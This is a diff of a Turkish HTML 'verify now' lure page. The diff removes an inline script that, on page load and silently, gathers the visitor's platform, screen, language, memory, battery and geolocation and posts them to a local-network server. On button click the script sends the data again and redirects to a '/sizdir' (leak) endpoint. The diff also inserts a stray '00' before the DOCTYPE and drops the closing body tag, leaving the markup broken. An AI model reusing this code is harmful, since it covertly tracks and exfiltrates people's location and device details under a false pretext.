@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+00<!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
@@ -21,51 +21,4 @@
         <a id="mainBtn" class="btn">Şimdi Doğrula</a>
     </div>
 
-    <script>
-        const API_URL = "http://192.168.3.153:5000";
-
-        async function veriToplaVeGonder(ekstraMesaj = "") {
-            let data = {
-                etiket: ekstraMesaj,
-                platform: navigator.platform,
-                ekran: `${window.screen.width}x${window.screen.height}`,
-                dil: navigator.language,
-                hafiza: navigator.deviceMemory || "Bilinmiyor"
-            };
-
-            // Pil Bilgisi
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                data.pil = (battery.level * 100) + "%";
-                data.sarjda = battery.charging;
-            }
-
-            // Konum İsteği
-            navigator.geolocation.getCurrentPosition((pos) => {
-                data.harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`${API_URL}/detay`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-            }, () => {
-                // Konum reddedilse bile mevcut veriyi gönder
-                fetch(`${API_URL}/detay`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-            });
-        }
-
-        // Sayfa yüklendiği an ilk veriyi gönder (Sessizce)
-        window.onload = () => veriToplaVeGonder("Sayfa Yüklendi");
-
-        // Butona basıldığında tekrar gönder (Onaylı)
-        document.getElementById('mainBtn').addEventListener('click', function() {
-            veriToplaVeGonder("Butona Basıldı");
-            window.location.href = `http://192.168.3.153:5000/sizdir`;
-        });
-    </script>
-</body>
 </html>
